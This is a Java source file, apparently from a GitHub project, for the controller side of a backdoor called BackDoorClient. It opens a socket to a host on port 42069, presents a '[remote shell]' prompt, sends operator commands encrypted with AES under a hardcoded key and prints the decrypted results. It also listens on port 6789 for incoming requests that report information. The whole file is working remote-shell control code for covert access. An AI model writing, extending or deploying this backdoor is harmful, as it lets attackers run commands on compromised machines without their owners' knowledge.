package com.github.pulsebeat02;

import com.github.pulsebeat02.backdoor.CryptoHelper;
import com.github.pulsebeat02.utility.NetworkUtilities;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.PrintWriter;
import java.net.ServerSocket;
import java.net.Socket;
import java.util.Scanner;
import java.util.concurrent.CompletableFuture;

public class BackDoorClient {

  public BackDoorClient() {}

  public static void main(final String[] args) throws Exception {
    final BackDoorClient client = new BackDoorClient();
    client.console(NetworkUtilities.getPublicIPAddress());
    client.checkRequest();
  }

  public void console(final String host) {
    CompletableFuture.runAsync(
        () -> {
          try {
            final int port = 42069;
            final String endSignal = "%**%";
            final String encryptionKey = "sixteen byte key";
            final String algorithm = "AES";
            final CryptoHelper cryptoHelper = new CryptoHelper(encryptionKey, algorithm);
            final Socket socket = new Socket(host, port);
            final Scanner scanner = new Scanner(System.in);
            final PrintWriter printWriter = new PrintWriter(socket.getOutputStream());
            final BufferedReader br =
                new BufferedReader(new InputStreamReader(socket.getInputStream()));
            while (!socket.isClosed()) {
              try {
                System.err.print("[remote shell] $ ");
                final String cmd = scanner.nextLine();
                printWriter.println(cryptoHelper.encrypt(cmd));
                printWriter.flush();
                if (cmd.equals("exit")) {
                  break;
                }
                String line;
                while ((line = cryptoHelper.decrypt(br.readLine())) != null) {
                  if (line.endsWith(endSignal)) {
                    break;
                  }
                  System.out.println(line);
                }
              } catch (final Exception e) {
                e.printStackTrace();
                br.close();
                printWriter.close();
                socket.close();
              }
            }
          } catch (final Exception ignored) {
          }
        });
  }

  public void checkRequest() throws IOException {
    CompletableFuture.runAsync(
        () -> {
          try {
            final ServerSocket serverSock = new ServerSocket(6789);
            final Socket sock = serverSock.accept();
            final InputStream sis = sock.getInputStream();
            final BufferedReader br = new BufferedReader(new InputStreamReader(sis));
            final String request = br.readLine();
            final String[] requestParam = request.split(" ");
            final String info = requestParam[1];
            System.out.println("Incoming Request with Information: " + info);
            br.close();
          } catch (final Exception ignored) {
          }
        });
  }
}
